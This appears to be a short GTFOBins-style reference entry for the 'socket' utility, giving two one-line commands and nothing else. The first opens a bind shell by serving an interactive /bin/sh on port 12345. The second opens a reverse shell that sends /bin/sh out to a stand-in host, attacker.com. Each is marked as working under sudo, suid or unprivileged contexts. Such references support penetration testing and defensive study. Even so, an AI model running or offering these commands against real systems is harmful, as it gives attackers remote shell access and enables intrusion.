title: socket
html:
socket

Bind Shell

Context: sudo, suid, unprivileged

socket -svp '/bin/sh -i' 12345

Reverse Shell

Context: sudo, suid, unprivileged

socket -qvp '/bin/sh -i' attacker.com 12345
